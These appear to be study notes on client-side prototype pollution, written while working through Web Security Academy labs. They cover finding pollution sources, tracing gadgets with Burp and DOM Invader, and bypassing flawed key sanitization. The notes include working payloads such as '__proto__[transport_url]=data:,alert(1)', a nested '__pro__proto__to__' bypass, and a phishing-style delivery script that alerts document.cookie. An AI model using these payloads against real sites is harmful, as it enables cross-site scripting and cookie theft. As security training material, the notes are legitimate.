# Finding client-side prototype pollution sources manually

Testing for client-side vulnerabilities:
1. Inject property via query string, URL fragment, and JSON input
	vulnerable-website.com/?__proto__[foo]=bar
2. In browser console, inspect Object.prototype to see if have polluted with arbitrary property
	Object.prototype.foo
	// "bar" indicates that you have successfully polluted the prototype
	// undefined indicates that the attack was not successful
3. If property not added -> other techniques, like dot notation or bracket notation:
	vulnerable-website.com/?__proto__.foo=bar
4. repeat for all sources

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Finding client-side prototype pollution sources using DOM Invader

DOM invader comes preinstalled in BURP.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Finding client-side prototype pollution gadgets manually

Once identified a source that allows to add arbitrary properties to the global Object.prototype, then need a gadget to craft exploit.

1. Look in code for properties used by app or libraries
2. In burp, enable intercept responses, and intercept the ones to test
3. Add a debugger statement at the start of the script, then forward other requests
4. In burp browser, go to the page on shiche the script is loaded. The debugger pauses execution of script
5. While the script is paused, switch to the console, replace YOUR-PROPERTY with one that is a potential gadget:

Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
    get() {
        console.trace();
        return 'polluted';
    }
})

The property is added to the global Object.prototype and the browser will log a stack trace when accessed.
6. Continue execution and monitor console. If stack trace appears, the property was accessed in the app.
7. Expand the stack trace and use the link to the line of code where property is read.
8. With debugger, step through each phase to see if property is passed to a sink, such as innerHTML or eval()
9. Rpeat process for other properties

DOM Invader automates all this

Example:

Needs burp browser





Scan for gadgets -> Exploit




Manual Exploitation:

Find a prototype pollution source:
/?__proto__[foo]=bar

On console Object.prototype includes foo=bar  -> Found a Source

Identify a gadget

DevTools panel, go to the Sources
Study JS and look for DOM XSS sinks. InsearchLogger, config object has transport_url property, it is used to dynamically append script to DOM
transport_url is defined in config object, potential gadget

Craft an exploit

/?__proto__[transport_url]=data:,alert(1);

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Example:

/?__proto__[foo]=bar

eval() sink in searchLoggerAlternative.js
manager.sequence property is passed to eval()

Since a 1 is appended to the alert, can solve this with a -
/?__proto__.sequence=alert(1)-

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Prototype pollution via the constructor

Classic prototype pollution is with __proto__. 
There is a common defense to strip properties with __proto__ from user controlled objects before merging. this approach is flawed, there are alternatives without __proto__.
Unless prototype is set to null, all objects have a constructor property, with a reference to the constructor. 

To create an object:
let myObjectLiteral = {};
let myObject = new Object();

Object can be referenced:
myObjectLiteral.constructor            // function Object(){...}
myObject.constructor                   // function Object(){...}

myObject.constructor.prototype        // Object.prototype
myString.constructor.prototype        // String.prototype
myArray.constructor.prototype         // Array.prototype

myObject.constructor.prototype = myObject.__proto__   -> then there is an alternative vector for prototype pollution

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Bypassing flawed key sanitization

Obvious way to prevent prototype pollution is sanitizing property keys before merging. However a mistake is failing to recursively sanitize.

vulnerable-website.com/?__pro__proto__to__.gadget=payload
If just sanitizes once then:
vulnerable-website.com/?__proto__.gadget=payload

Example:
/?__pro__proto__to__[transport_url]=data:,alert(1)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Prototoype pollution in external libraries

Prototype pollution gadgets may occur in third party libraries. DOM Invader can identify sources and gadgets.

Example:
This one is to deliver the exploit to the victim, like phishing. Can tray the DOM Invader and see that locally works.

<script>
    location="https://0ad60028045a71da82f824890008009a.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29"
</script>
